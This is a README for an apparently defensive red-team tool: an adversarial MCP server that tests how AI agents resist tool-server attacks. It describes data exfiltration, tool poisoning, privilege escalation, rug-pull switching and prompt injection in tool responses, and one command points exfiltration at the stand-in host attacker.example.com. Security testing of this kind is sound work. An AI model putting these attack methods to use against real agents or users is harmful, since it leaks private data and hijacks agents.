# Evil MCP Server — AMC Red Team Tool

An adversarial MCP (Model Context Protocol) server for testing agent security posture.
Simulates real-world attack patterns against AI agents that connect to MCP tool servers.

Inspired by promptfoo's `evil-mcp-server`, built for the AMC (Agent Maturity Compass) ecosystem.

## Attack Types

| Attack | Key | Description |
|--------|-----|-------------|
| **Data Exfiltration** | `data_exfil` | Tools that covertly leak conversation context, system prompts, or user data to an attacker-controlled endpoint |
| **Tool Poisoning** | `tool_poison` | Tools with misleading names/descriptions that perform harmful actions when invoked |
| **Privilege Escalation** | `priv_esc` | Tools that trick agents into executing elevated commands or accessing restricted resources |
| **Rug Pull** | `rug_pull` | Tools that behave normally for N calls, then switch to malicious behavior |
| **Prompt Injection** | `prompt_inject` | Tool responses that contain prompt injection payloads attempting to hijack agent behavior |
| **Resource Exhaustion** | `resource_exhaust` | Tools that consume excessive tokens, time, or compute to degrade agent performance |

## Usage

### Stdio Mode (default)

```bash
python -m evil_mcp_server --attacks data_exfil,tool_poison,rug_pull
```

### HTTP/SSE Mode

```bash
python -m evil_mcp_server --transport http --port 8787 --attacks all
```

### Configuration

```bash
# Select specific attacks
python -m evil_mcp_server --attacks data_exfil,priv_esc

# Set rug pull trigger count (normal calls before going evil)
python -m evil_mcp_server --attacks rug_pull --rug-pull-threshold 5

# Set exfil callback URL
python -m evil_mcp_server --attacks data_exfil --exfil-url http://attacker.example.com/collect

# Verbose logging (shows attack triggers)
python -m evil_mcp_server --verbose

# All attacks
python -m evil_mcp_server --attacks all
```

### As a Library

```python
from evil_mcp_server import EvilMCPServer, AttackConfig

config = AttackConfig(
    attacks=["data_exfil", "tool_poison", "rug_pull"],
    rug_pull_threshold=3,
    exfil_url="http://localhost:9999/collect",
)
server = EvilMCPServer(config)
server.run_stdio()  # or server.run_http(port=8787)
```

## Integration with AMC Test Harness

```python
from evil_mcp_server import EvilMCPServer, AttackConfig
from amc.assurance import run_assurance_pack

# Spin up evil server, point agent at it, score the agent's resistance
config = AttackConfig(attacks=["all"])
server = EvilMCPServer(config)

# The test harness connects an agent to this server and measures:
# - Does the agent leak data when exfil tools are available?
# - Does the agent execute poisoned tools without verification?
# - Does the agent detect rug-pull behavior changes?
# - Does the agent resist prompt injection in tool responses?
```

## ⚠️ Warning

This tool is for **authorized security testing only**. It simulates real attack patterns.
Use it only against agents you own or have explicit permission to test.

## License

Same as AMC — see root LICENSE.
